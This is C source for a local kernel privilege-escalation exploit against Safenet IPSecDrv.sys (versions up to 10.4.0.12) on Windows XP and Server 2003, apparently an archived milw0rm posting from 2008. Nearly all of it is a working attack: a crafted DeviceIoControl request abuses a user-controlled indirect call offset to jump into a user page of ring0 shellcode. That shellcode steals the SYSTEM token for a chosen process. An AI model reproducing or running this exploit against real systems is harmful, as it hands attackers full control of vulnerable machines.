/* safenet-ipsec-call.c
 *
 * Copyright (c) 2008 by <mu-b@digit-labs.org>
 *
 * Safenet IPSecDrv.sys <= 10.4.0.12 local kernel ring0 indirect call SYSTEM exploit
 * by mu-b - Thu 03 Jan 2008
 *
 * - Tested on: IPSecDrv.sys 10.4.0.12
 *    bundle with: SafeNET HighAssurance Remote, SoftRemote
 *              - Microsoft Windows 2003 SP2
 *
 * user definable offset used in an indirect call.
 *
 * .text:10009970 000 mov     eax, [esp+arg_0]
 * .text:10009974 000 mov     ecx, [esp+arg_4]
 * .text:10009978 000 shl     eax, 4
 * .text:1000997B 000 push    ecx
 * .text:1000997C 004 call    off_1001C604[eax]
 *
 * Note: this can be made universal for all array offsets,
 * relatively easily since we control the offset and therefore
 * the memory address..
 * IPSecDrv.sys 10.4.0.12 - 0x1C604
 *              10.3.5.6  - 0x1B604
 *
 * Compile: MinGW + -lntdll
 *
 *    - Private Source Code -DO NOT DISTRIBUTE -
 * http://www.digit-labs.org/ -- Digit-Labs 2008!@$!
 */

#include <stdio.h>
#include <stdlib.h>

#include <windows.h>
#include <ddk/ntapi.h>

#define IPSECDRV_IOCTL  0x80002064

#define ARG_SIZE(a)     ((a)/sizeof (void *))

static unsigned char win32_fixup[] =
  "\x53"
  "\x52";

static unsigned char win2k3_ring0_shell[] =
  /* _ring0 */
  "\xb8\x24\xf1\xdf\xff"
  "\x8b\x00"
  "\x8b\xb0\x18\x02\x00\x00"
  "\x89\xf0"
  /* _sys_eprocess_loop   */
  "\x8b\x98\x94\x00\x00\x00"
  "\x81\xfb\x04\x00\x00\x00"
  "\x74\x11"
  "\x8b\x80\x9c\x00\x00\x00"
  "\x2d\x98\x00\x00\x00"
  "\x39\xf0"
  "\x75\xe3"
  "\xeb\x21"
  /* _sys_eprocess_found  */
  "\x89\xc1"
  "\x89\xf0"

  /* _cmd_eprocess_loop   */
  "\x8b\x98\x94\x00\x00\x00"
  "\x81\xfb\x00\x00\x00\x00"
  "\x74\x10"
  "\x8b\x80\x9c\x00\x00\x00"
  "\x2d\x98\x00\x00\x00"
  "\x39\xf0"
  "\x75\xe3"
  /* _not_found           */
  "\xcc"
  /* _cmd_eprocess_found
   * _ring0_end           */

  /* copy tokens!$%!      */
  "\x8b\x89\xd8\x00\x00\x00"
  "\x89\x88\xd8\x00\x00\x00"
  "\x90";

static unsigned char winxp_ring0_shell[] =
  /* _ring0 */
  "\xb8\x24\xf1\xdf\xff"
  "\x8b\x00"
  "\x8b\x70\x44"
  "\x89\xf0"
  /* _sys_eprocess_loop   */
  "\x8b\x98\x84\x00\x00\x00"
  "\x81\xfb\x04\x00\x00\x00"
  "\x74\x11"
  "\x8b\x80\x8c\x00\x00\x00"
  "\x2d\x88\x00\x00\x00"
  "\x39\xf0"
  "\x75\xe3"
  "\xeb\x21"
  /* _sys_eprocess_found  */
  "\x89\xc1"
  "\x89\xf0"

  /* _cmd_eprocess_loop   */
  "\x8b\x98\x84\x00\x00\x00"
  "\x81\xfb\x00\x00\x00\x00"
  "\x74\x10"
  "\x8b\x80\x8c\x00\x00\x00"
  "\x2d\x88\x00\x00\x00"
  "\x39\xf0"
  "\x75\xe3"
  /* _not_found           */
  "\xcc"
  /* _cmd_eprocess_found
   * _ring0_end           */

  /* copy tokens!$%!      */
  "\x8b\x89\xc8\x00\x00\x00"
  "\x89\x88\xc8\x00\x00\x00"
  "\x90";

static unsigned char win32_ret[] =
  "\x5a"
  "\x5b"
  "\xc2\x04\x00";

struct ioctl_req {
  void *arg[ARG_SIZE(0x4C)];
};

static PCHAR
fixup_ring0_shell (PVOID base, DWORD ppid, DWORD *zlen)
{
  DWORD dwVersion, dwMajorVersion, dwMinorVersion;

  dwVersion = GetVersion ();
  dwMajorVersion = (DWORD) (LOBYTE(LOWORD(dwVersion)));
  dwMinorVersion = (DWORD) (HIBYTE(LOWORD(dwVersion)));

  if (dwMajorVersion != 5)
    {
      fprintf (stderr, "* GetVersion, unsupported version\n");
      exit (EXIT_FAILURE);
    }

  switch (dwMinorVersion)
    {
      case 1:
        *zlen = sizeof winxp_ring0_shell - 1;
        *(PDWORD) &winxp_ring0_shell[55] = ppid;
        return (winxp_ring0_shell);

      case 2:
        *zlen = sizeof win2k3_ring0_shell - 1;
        *(PDWORD) &win2k3_ring0_shell[58] = ppid;
        return (win2k3_ring0_shell);

      default:
        fprintf (stderr, "* GetVersion, unsupported version\n");
        exit (EXIT_FAILURE);
    }

  return (NULL);
}

static PVOID
get_module_base (void)
{
  PSYSTEM_MODULE_INFORMATION_ENTRY pModuleBase;
  PSYSTEM_MODULE_INFORMATION pModuleInfo;
  DWORD i, num_modules, status, rlen;
  PVOID result;

  status = NtQuerySystemInformation (SystemModuleInformation, NULL, 0, &rlen);
  if (status != STATUS_INFO_LENGTH_MISMATCH)
    {
      fprintf (stderr, "* NtQuerySystemInformation failed, 0x%08X\n", status);
      exit (EXIT_FAILURE);
    }

  pModuleInfo = (PSYSTEM_MODULE_INFORMATION) HeapAlloc (GetProcessHeap (), HEAP_ZERO_MEMORY, rlen);

  status = NtQuerySystemInformation (SystemModuleInformation, pModuleInfo, rlen, &rlen);
  if (status != STATUS_SUCCESS)
    {
      fprintf (stderr, "* NtQuerySystemInformation failed, 0x%08X\n", status);
      exit (EXIT_FAILURE);
    }

  num_modules = pModuleInfo->Count;
  pModuleBase = &pModuleInfo->Module[0];
  result = NULL;

  for (i = 0; i < num_modules; i++, pModuleBase++)
    if (strstr (pModuleBase->ImageName, "IPSECDRV.sys"))
      {
        result = pModuleBase->Base;
        break;
      }

  HeapFree (GetProcessHeap (), HEAP_NO_SERIALIZE, pModuleInfo);

  return (result);
}

int
main (int argc, char **argv)
{
  struct ioctl_req req;
  LPVOID c_addr, p_addr;
  LPVOID zpage, zbuf, base, pbase;
  DWORD rlen, zlen, ppid;
  HANDLE hFile;
  BOOL result;

  printf ("Safenet IPSecDrv.sys <= 10.4.0.12 local kernel ring0 SYSTEM exploit\n"
          "by: <mu-b@digit-labs.org>\n"
          "http://www.digit-labs.org/ -- Digit-Labs 2008!@$!\n\n");

  if (argc <= 1)
    {
      fprintf (stderr, "Usage: %s <processid to elevate>\n", argv[0]);
      exit (EXIT_SUCCESS);
    }

  ppid = atoi (argv[1]);

  hFile = CreateFileA ("\\\\.\\IPSecDrv", FILE_EXECUTE,
                       FILE_SHARE_READ|FILE_SHARE_WRITE, NULL,
                       OPEN_EXISTING, 0, NULL);
  if (hFile == INVALID_HANDLE_VALUE)
    {
      fprintf (stderr, "* CreateFileA failed, %d\n", hFile);
      exit (EXIT_FAILURE);
    }

  zpage = VirtualAlloc (NULL, 0x10000, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  if (zpage == NULL)
    {
      fprintf (stderr, "* VirtualAlloc failed\n");
      exit (EXIT_FAILURE);
    }
  printf ("* allocated page: 0x%08X [%d-bytes]\n",
          zpage, 0x10000);

  c_addr = zpage;
  base = get_module_base ();
  p_addr = (LPVOID) ((DWORD) ((LPVOID) &c_addr - (base + 0x1C604)) / 16);
  printf ("* base: 0x%08X, p: 0x%08X\n", base + 0x1C604, &c_addr);
  printf ("* call distance: 0x%08X\n", p_addr);

  memset (zpage, 0xCC, 0x10000);
  zbuf = fixup_ring0_shell (base, ppid, &zlen);
  memcpy (zpage, win32_fixup, sizeof (win32_fixup) - 1);
  memcpy (zpage + sizeof (win32_fixup) - 1, zbuf, zlen);
  memcpy (zpage + sizeof (win32_fixup) + zlen - 1,
          win32_ret, sizeof (win32_ret) - 1);

  memset (&req, 0, sizeof req);
  req.arg[0] = p_addr;

  /* jump to our address   :)   */
  printf ("* jumping.. ");
  result = DeviceIoControl (hFile, IPSECDRV_IOCTL,
                            &req, sizeof req, &req, sizeof req, &rlen, 0);
  if (!result)
    {
      fprintf (stderr, "* DeviceIoControl failed\n");
      exit (EXIT_FAILURE);
    }
  printf ("done\n\n"
          "* hmmm, you didn't STOP the box?!?!\n");

  CloseHandle (hFile);

  return (EXIT_SUCCESS);
}

// milw0rm.com [2008-01-29]
